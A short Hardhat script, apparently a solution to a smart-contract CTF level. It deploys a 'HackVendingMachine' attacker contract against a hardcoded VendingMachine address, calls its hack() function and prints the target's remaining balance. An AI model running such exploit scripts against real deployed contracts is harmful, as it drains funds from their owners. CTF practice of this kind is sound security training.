const hre = require("hardhat");
const { ethers } = hre;

const machineAddress = '0x00f4b86F1aa30a7434774f6Bc3CEe6435aE78174';

async function main() {
  const HackVendingMachine = await ethers.getContractFactory("HackVendingMachine");
  const hackVendingMachine = await HackVendingMachine.deploy(machineAddress, { value: ethers.utils.parseEther("0.1")});

  const tx = await hackVendingMachine.hack();
  console.log('TX: ', tx.hash);
  await tx.wait();

  const balance = await ethers.provider.getBalance(machineAddress);
  console.log("VendingMachine balance:", balance.toString());

  console.log('Done!');
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
